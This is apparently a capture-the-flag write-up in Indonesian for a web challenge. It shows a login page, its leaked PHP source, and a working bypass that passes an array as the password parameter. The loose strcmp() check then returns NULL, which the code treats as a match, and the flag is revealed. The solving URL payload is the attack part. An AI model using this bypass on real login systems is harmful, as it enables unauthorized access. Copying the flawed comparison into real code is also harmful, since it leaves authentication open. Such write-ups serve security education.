# Surat Tanda Registrasi Calon Menantu baPakmu (50 Points)
No Caption. http://soal.pucc.or.id/scm/
# Solved
Mari kita cek source dari website tersebut
```html
<!doctype html>
<html lang="en">

<meta http-equiv="content-type" content="text/html;charset=utf-8" />
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="Mark Otto, Jacob Thornton, and Bootstrap contributors">
    <meta name="generator" content="Jekyll v3.8.5">
    <title>Login Bang</title>

    <link rel="canonical" href="index.html">

    <!-- Bootstrap core CSS -->
<link href="https://getbootstrap.com/docs/4.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">


    <style>
      .bd-placeholder-img {
        font-size: 1.125rem;
        text-anchor: middle;
        -webkit-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
      }

      @media (min-width: 768px) {
        .bd-placeholder-img-lg {
          font-size: 3.5rem;
        }
      }
    </style>
    <!-- Custom styles for this template -->
    <link href="signin.css" rel="stylesheet">
  </head>
  <body class="text-center">
<div class="container">
    <form class="form-signin" method="GET" action="">
  <img class="mb-4" src="http://ctf.pucc.or.id:9999/files/d5663db46975e1e7bfaecebf19d1d0ea/favicon.png" alt="" width="150" height="150">
  <h1 class="h3 mb-3 font-weight-normal">Login Dulu</h1>
  <label for="username" class="sr-only">Username</label>
  <input type="text" id="username" class="form-control" placeholder="Username" required name="uname">
  <label for="inputPassword" class="sr-only">Password</label>
  <input type="password" id="inputPassword" class="form-control" placeholder="Password" required name="password">
  <input class="btn btn-lg btn-primary btn-block" type="submit" value="Login">
  <p class="mt-5 mb-3 text-muted">&copy; 2020</p>
</form>
</div>
</body>

</html>
<!--Source ? : https://pastebin.com/raw/uhXkEHZ3 -->
```
Bisa kita lihat disini, bahwa ada komentar yang menunjukkan source code dari website tersebut mari kita coba buka
```php
<?php

error_reporting(0);

define('FLAG', '==MAU TAU AJA==');

if(isset($_GET["password"])){
  $password = $_GET["password"];
  $rahasia  = "--RAHASIA DONG--";

  if(strcmp($password, $rahasia) == 0){
    echo "<h1>Flag nya : </h1>".FLAG;
  }else{
    echo "<script>alert('Salah Koplok')</script>";
  }
}
?>
```
Mari kita lihat fungsi dari <b>strcmp</b> yang menunjukkan kita harus mencari tau variabel <b>rahasia</b>. Tapi bagaimana kita mencari tau nya ?<br>
```php
// Gunakan testing ini pada compiler php
$password = ['test'];
$rahasia  = '???????';

echo var_dump(strcmp($password, $rahasia));
```
Setelah mengeksekusi, kita mendapatkan hasil output <b>NULL</b> atau <b>0</b>. Nah ini untuk local, bagaimana kita implementasikan ke website melalui method GET ?
```
https://soal.pucc.or.id/scm/?uname=1&password[anything]=1
```
Flag : <b>PUCC{strcmp()_isnt_saf3_br0}</b>
